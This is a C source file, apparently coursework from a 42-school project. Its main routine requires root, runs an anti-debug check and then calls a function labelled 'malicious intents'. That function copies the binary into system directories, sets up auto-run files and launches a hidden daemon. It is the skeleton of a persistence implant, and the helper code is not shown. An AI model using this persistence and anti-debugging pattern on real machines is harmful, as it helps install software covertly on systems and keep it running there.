/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
/*   Updated: 2025/07/17 02:05:25 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <shield.h>
#include <shield/daemon.h>
#include <stdio.h>
#include <unistd.h>
#include "antidebug.inc.c"

#if MATT_MODE
#include <errno.h>
#include <stdbool.h>
#include <sys/stat.h>

/**
 * @brief	Check if a daemon is already running.
 */
static inline bool	shield_daemon_check(void)
{
	struct stat	s;

	if (stat(DAEMON_LOCK_FILE, &s))
	{
		if (errno != ENOENT)
			perror("stat");
		return (errno == ENOENT);
	}
	puts("Daemon already running!");
	return (false);
}
#endif // MATT_MODE

/**
 * @brief	Malicious intents. 
 *
 * This function will:
 *	- Copy the program to the system's binaries directory.
 *	  - Modify the entrypoint to the daemon's entry.
 *	  - Change the permissions of the binary to 0755.
 *  - Create the auto-run files.
 *  - Launch the daemon.
 */
static inline void	shield_malicious_intents(void)
{
#if MATT_MODE
	DEBUG("matt_daemon_check\n");
	if (!shield_daemon_check())
		return ;
#else // if !MATT_MODE
	DEBUG("shield_copy\n");
	if (!shield_copy())
		return ;
	DEBUG("shield_autorun_setup\n");
	if (!shield_autorun_setup())
		return ;
#endif // !MATT_MODE
	DEBUG("shield_daemonize\n");
	shield_daemonize();
	DEBUG("done\n");
}

int	main(void)
{
	const int	euid = geteuid();

	DEBUG("got euid: %d\n", euid);
	if (euid != 0)
	{
		if (SHIELD_DEBUG)
		{
			DEBUG("Skipping root check\n");
		}
		else
		{
			puts("You need to run this program as root!");
			return (1);
		}
	}
	if (shield_antidebug())
	{
		DEBUG("passed anti-debug check\n");
		shield_malicious_intents();
		DEBUG("done\n");
	}
#if !MATT_MODE
#define LOGINS "kiroussa & lvincent\n"
	(void)!write(1, LOGINS, sizeof(LOGINS));
#endif
	return (0);
}
